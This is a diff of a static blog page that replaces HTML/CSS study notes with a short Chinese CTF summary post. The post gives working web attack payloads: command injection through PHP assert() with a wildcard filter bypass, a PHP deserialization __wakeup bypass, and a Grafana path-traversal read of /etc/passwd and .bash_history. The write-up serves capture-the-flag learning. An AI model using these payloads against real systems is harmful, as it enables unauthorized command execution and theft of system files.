@@ -4,9 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="20221031, Robin">
-    <meta name="description" content="每日一记复选框&amp;lt;input type=&amp;quot;radio&amp;quot; name=&amp;quot;1&amp;quot; id=&amp;quot;man&amp;quot;&amp;gt;
-&amp;lt;label for=&amp;quot;man&amp;quot;&amp;gt;男&amp;lt;">
+    <meta name="keywords" content="20221106CTF总结, Robin">
+    <meta name="description" content="404页面:url+404/
+命令执行:&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;]))&amp;#123;
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>20221031 | Robin</title>
+    <title>20221106CTF总结 | Robin</title>
     <link rel="icon" type="image/png" href="../../../../favicon.png">
     
     <style>
@@ -344,12 +348,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">20221031</h1>
+                    <h1 class="description center-align post-title">20221106CTF总结</h1>
                 </div>
             </div>
         </div>
@@ -369,25 +373,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
-                                <span class="chip bg-color">日报</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="../../../../categories/%E6%97%A5%E6%8A%A5/" class="post-category">
-                                日报
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -396,28 +387,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-10-31
+                    2022-11-06
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-02
+                    2022-11-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    419
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    1 分
                 </div>
                 
 
@@ -437,198 +428,37 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h1><h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><pre><code>&lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;
-&lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;
-这里做一个补充:id是为了点击文字也可以选中，不然就只能点击那个圈来选了
+                <h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p>
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件
+        highlight_file(&quot;flag.php&quot;);
+    &#125;
 
-回归正轨
-1.
-type=&quot;checkbox&quot;可以多选
-2.
-type=&quot;checkbox&quot; checked=&quot;checked&quot;就能变成默认选中
-3.
-disabled=&quot;disabled&quot;或者disabled可以禁用该模块
-4.
-readonly是只读不能改
-</code></pre>
-<h3 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h3><pre><code>&lt;body&gt;
-    &lt;select size=&quot;3&quot; multiple&gt;                              #size是一面可显示的选项  multiple是可多选
-        &lt;option value=&quot;a&quot;&gt;&lt;/option&gt;
-        &lt;option value=&quot;b&quot;&gt;&lt;/option&gt;                         #value是提供给后端使用的value值
-        &lt;option value=&quot;c&quot;&gt;&lt;/option&gt;
-        &lt;option value=&quot;d&quot; selected&gt;&lt;/option&gt;                #selected默认选中
-    &lt;/select&gt;
-&lt;/body&gt;
-</code></pre>
-<h3 id="文本域-多行文本输入框"><a href="#文本域-多行文本输入框" class="headerlink" title="文本域(多行文本输入框)"></a>文本域(多行文本输入框)</h3><pre><code>&lt;div&gt;
-    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot; placeholder=&quot;&quot;&gt;内容&lt;/textarea&gt;
-&lt;/div&gt;
-cols是列   
-rows是行
-placeholder是预置文本，输入就会消失
-&lt;style&gt;
-    textarea&#123;
-        width:100px;
-        height:100px;
-        resize:vertical;
+    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符
+        $page = $_GET[&#39;c&#39;];
     &#125;
-&lt;/style&gt;
-horizontal水平可调节both都可以none不能更改
+    
+assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数
 
-注意:placeholder的默认value是两个标识符之间的，换行也会跟着换行
-</code></pre>
-<h3 id="字段集"><a href="#字段集" class="headerlink" title="字段集"></a>字段集</h3><pre><code>&lt;fieldset&gt;
-    &lt;legend&gt;内容1&lt;/legend&gt;
-    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项1
-    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项2
-    &lt;legend&gt;内容2&lt;/legend&gt;
-&lt;/fieldset&gt;
-</code></pre>
-<h2 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h2><p>1.指定UTF-8<br>2.增加语义化标签(便于爬虫)<br>&nbsp;&nbsp; section,article,aside,header,footer,nav,figure,main<br>3.可以省略结束标签(最好不要)<br>4.在标签中可以使用单引号<br>5.音视频标签</p>
-<pre><code>&lt;body&gt;
-    &lt;audio src=&quot;路径&quot; cintrols&gt;&lt;/audio&gt;
-    &lt;video src=&quot;路径&quot; poster=&quot;路径&quot;&gt;&lt;/video&gt;
-&lt;/body&gt;
-
-controls 可控制
-loop 循环
-autoplay 自动播放
-muted 静音播放
-poster 海报
-注意:设置宽高要适应视频画面大小
-</code></pre>
-<h3 id="表单增强-以上传后端为例"><a href="#表单增强-以上传后端为例" class="headerlink" title="表单增强(以上传后端为例)"></a>表单增强(以上传后端为例)</h3><pre><code>一，颜色选择
-&lt;form action=&quot;action&quot;&gt;
-    &lt;input type=&quot;color&quot; name=&quot;aaa&quot; autofocus&gt;            #选择颜色，autofocus光标默认在这里
-    &lt;input type=&quot;email&quot; name=&quot;mymail&quot; required&gt;          #选择邮箱，required必填项
-    &lt;input type=&quot;url&quot; name=&quot;bbb&quot; multiple&gt;               #选择地址，multiple可选择多个地址，用逗号隔开
-    &lt;input type=&quot;tel&quot; name=&quot;ccc&quot;&gt;                        #tel只在手机端有用，显示输入页面
-    &lt;input type=&quot;range&quot; name=&quot;ddd&quot; min=&quot;100&quot; max=&quot;1000&quot; value=&quot;100&quot; step=&quot;10&quot;&gt;    #range滑块效果
-    &lt;input type=&quot;number&quot; name=&quot;eee&quot; min=&quot;0&quot; max=&quot;10&quot; value=&quot;4&quot; step=&quot;2&quot;&gt;          #选择数字，value是初始数据
-    &lt;input type=&quot;search&quot; name=&quot;fff&quot;&gt;                     #搜索框
-    &lt;input type=&quot;date&quot; name=&quot;ggg&quot;&gt;                       #选择日期，type改成month是精确到月份
-    &lt;input type=&quot;datetime-local&quot; name=&quot;hhh&quot;&gt;             #精确到秒
-&lt;/form&gt;
-注意！！！
-没有name就不能传到后端，提交了会在url上显示
-
-二，数据列表
-&lt;body&gt;
-    &lt;input type=&quot;text&quot; list=&quot;mylist&quot;&gt;              这里的list
-    &lt;datalist id=&quot;mylist&quot;&gt;                         和这里的id关联
-        &lt;option value=&quot;111111&quot;&gt;&lt;/option&gt;
-        &lt;option value=&quot;2433445&quot;&gt;&lt;/option&gt;
-        &lt;option value=&quot;333436653&quot;&gt;&lt;/option&gt;        上面输入就可以在下面显示有关的内容
-        &lt;option value=&quot;4、3、78&quot;&gt;&lt;/option&gt;
-    &lt;/datalist&gt;
-&lt;/body&gt;
-
-三，正则表达式
-在input中加入 pattern=&quot;[0-9][A-Z]&#123;3&#125;&quot;
-代表第一个要是0-9的，后面接着三个要是A-Z的
-</code></pre>
-<h2 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h2><h4 id="选择器回顾-更新"><a href="#选择器回顾-更新" class="headerlink" title="选择器回顾+更新"></a>选择器回顾+更新</h4><pre><code>一，层级选择器+属性选择器
-&lt;style&gt;
-    .child+li&#123;                       #这个child后面的第一个同级的li标签改变
-        background:red;        
-    &#125;
-    .child~li&#123;                       #这个后面所有同级的li标签都改变
-        background:red;
-    &#125;
-    div[class]&#123;                      #所有div而且有class的都改变
-        background:red;
-    &#125;
-    div [class]&#123;                     #加了空格，div后代有class的都改变
-        background:red;
-    &#125;
-    div[class=box1]&#123;                 #是div而且属性是box1的才改变
-        background:red;
-    &#125;
-&lt;/style&gt;
-拓展————模糊匹配:
-class^&quot;b&quot;   以b开头的
-class$&quot;b&quot;   以b结尾的
-class*&quot;b&quot;   包含b的
-
-二，结构伪类选择器
-&lt;style&gt;
-    ul li:first-child&#123;       #选择第一个
-        color:red;
-    &#125;
-    ul li:last-child&#123;        #最后一个
-        color:red;
-    &#125;
-    li:nth-child(odd)&#123;       #选定第几个，odd/2n+1/2n-1是奇数，2n/even是偶数
-        color:red;
-    &#125;
-    li:nth-onlychild&#123;        #匹配div下而且只有一个p的
-        color:red;
-    &#125;
-    div:empty&#123;               #匹配根元素(HTML)
-        color:red;
-    &#125;
-    :root,body&#123;              #匹配没有任何元素的，包括空格
-        color:red;
-    &#125;
-&lt;/style&gt;
-
-三，目标伪类选择器
-div.&#123;                        #先让全部使用一个style
-    display:none;
+&#125;else&#123;
+    highlight_file(__FILE__);
 &#125;
-div.:target&#123;                 #再让点到的目标换成指定的style
-    display:block;
-&#125;
+?&gt;
+利用assert函数的特性，实现命令执行
+assert函数里面的参数为字符串时，会将字符串当做php命令来执行。
+assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;
+构造闭合函数，使 assert 函数执行系统命令
+为还过滤了 flag 字符，使用?匹配符绕过
 
-四，UI状态伪类选择器
-input:checked&#123;               #匹配选择的
-    background:red;  
-&#125;
-        input:focus&#123;         #匹配手动focus的
-    background:red;
-&#125;
-
-四，否定伪类选择器
-li:not(:nth-child(2n+1))&#123;    #匹配所有不匹配的
-    color:red;
-&#125;
-其它:
-X:link  链接伪类选择器，超链接未被访问过的
-X:visited  链接伪类选择器，超链接被访问过的
-X:active  用户行为选择器，被激活的(常用于链接)
-X:hover  用户行为选择器，停留在上方的
+Payload：
+?c=1&#39;) or system(&#39;ls
+?c=1&#39;) or system(&#39;cat fla?.txt
 </code></pre>
-<h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><pre><code>文本阴影
-div&#123;
-    text-shadow:10px -10px 1px red;     #水平方向，垂直方向，模糊程度，阴影颜色
-&#125;
-如果要多个阴影，在颜色后面加逗号之后再加上另一个的参数，分号不要漏!!!
-
-盒子阴影
-div&#123;
-    width:100px;
-    ...
-    box-shadow: 10px(水平) 10px(垂直) 1px(模糊程度) 10px(阴影大小) red inside(内阴影);
-&#125;
-</code></pre>
-<h3 id="圆角边框-放在style里"><a href="#圆角边框-放在style里" class="headerlink" title="圆角边框(放在style里)"></a>圆角边框(放在style里)</h3><p>同时设置四个角:<br>border-radius:10px;<br>1.从四个角往内截10px(可以使用百分比)<br>2.设置一个值，四个角一样<br>3.设置两个值，左上右下——&gt;左下右上<br>4.设置三个值，左上——&gt;左下右上——&gt;右下<br>5.设置四个值，左上开始顺时针</p>
-<p>设置单个角:<br>boder-top-left-radius:10px;<br>boder-top-right-radius:10px;<br>boder-bottom-left-radius:10px;<br>boder-bottom-right-radius:10px;</p>
-<p>border-radius:10px/20px;<br>水平/垂直切割，只支持boder-radius</p>
-<h3 id="字体引入"><a href="#字体引入" class="headerlink" title="字体引入"></a>字体引入</h3><pre><code>&lt;style&gt;
-    @font-family:kerwin;                   #字体名字
-    src:url(font/STHUPO.TTF);              #字体文件路径
-    div&#123;
-        font-family:kerwin;                #字体名字
-        font-size:50px;       
-        color:red;
-        text-shadow:5px 0px 0px green;
-    &#125;
-&lt;/style&gt;
-</code></pre>
-<h3 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h3><h4 id="怪异盒模型"><a href="#怪异盒模型" class="headerlink" title="怪异盒模型"></a>怪异盒模型</h4><p>box-sizing: content-box;      #普通盒模型，增加padding时会扩张box<br>box-sizing: border-box;       #怪异盒模型，增加时不会撑大</p>
-<h4 id="弹性盒模型-能够适应页面"><a href="#弹性盒模型-能够适应页面" class="headerlink" title="弹性盒模型(能够适应页面)"></a>弹性盒模型(能够适应页面)</h4><p>display:flex;<br>1.默认横向排列，不是浮动。<br>2.行内元素变为块级元素。<br>3.margin:auto;自动居中<br>4.flex-direction: column;<br>5.column主轴列向排列，row纵向排列;column-reverse；纵向倒序排列，row-reverse横向倒序排列<br>6.justify-content:flex-end;主轴位置<br>align-items:center;侧轴位置<br>7.flex-start靠左对齐;flex-end靠右对齐;center靠中对齐;space-around环绕;space-between两端对齐</p>
-<h4 id="折行与行间距"><a href="#折行与行间距" class="headerlink" title="折行与行间距"></a>折行与行间距</h4><p>flex-wrap:wrap;                #打开折行<br>align-content:flex-start;      #折行之后的行间距<br>flex-start,flex-end,center,space-around,space-between同上</p>
-<h2 id="至此，HTML与CSS结束！"><a href="#至此，HTML与CSS结束！" class="headerlink" title="至此，HTML与CSS结束！"></a>至此，HTML与CSS结束！</h2><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句:"></a>每日一句:</h5><p>&nbsp;&nbsp;每一个问题都想给出回答，也有一些想说的，想劝的，想帮的，但想到自己的生活也是一地鸡毛。<br>「我们每个人都把自己活得一团糟，却总以为可以指导别人过得更好。」<br>&nbsp;&nbsp;但说回来还是一句用烦了的话，提升自己是解决一切问题的方式，亲情爱情友情都是，在现在这个世界里，经济独立财富自由能解决百分之九十的烦恼，很现实也很真实，我文化不高总觉得词不达意，慢慢来捱过去总会越来越好的，到达谷底的人怎么走都是向上的</p>
+<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p>
+<h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>
 
                 
             </div>
@@ -692,11 +522,7 @@ div&#123;
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
-                                    <span class="chip bg-color">日报</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -792,66 +618,18 @@ div&#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="../b-13/">
+                <a href="">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/5.jpg" class="responsive-img" alt="20221031">
+                        <img src="../../../../medias/featureimages/17.jpg" class="responsive-img" alt="20221106CTF总结">
                         
-                        <span class="card-title">20221031</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-31
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="../../../../categories/%E9%9A%8F%E7%AC%94/" class="post-category">
-                                    随笔
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="../../../../tags/%E9%9A%8F%E7%AC%94/">
-                        <span class="chip bg-color">随笔</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="../../20/b-12/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="../../../../medias/featureimages/13.jpg" class="responsive-img" alt="20221020">
-                        
-                        <span class="card-title">20221020</span>
+                        <span class="card-title">20221106CTF总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -862,7 +640,45 @@ div&#123;
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            liuGuobin
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../20221105/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../medias/featureimages/21.jpg" class="responsive-img" alt="20221105">
+                        
+                        <span class="card-title">20221105</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-06
                             </span>
                         <span class="publish-author">
                             
